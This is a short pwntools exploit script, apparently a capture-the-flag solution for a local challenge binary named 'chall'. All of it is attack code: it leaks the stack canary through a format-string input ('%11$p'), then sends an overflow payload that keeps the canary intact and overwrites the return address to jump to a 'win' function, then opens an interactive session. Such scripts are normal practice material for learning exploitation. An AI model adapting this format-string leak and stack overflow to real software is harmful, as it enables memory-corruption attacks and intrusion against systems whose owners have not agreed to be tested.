from pwn import *

"""
    canary - rsp
6 + ------------ = 11
     block size
"""

elf = context.binary = ELF('./chall')
p = process(elf.path)

f_win = p64(elf.symbols["win"])

# get canary
p.recvuntil(b'name:')
p.sendline(b'%11$p')
p.recvuntil(b', ')
canary = int(p.recv(18).decode(), 16)

payload = b'A' * (0x20 - 0x8)
payload += p64(canary)
payload += b'B' * 0x8
payload += f_win

p.sendline(payload)
p.interactive()
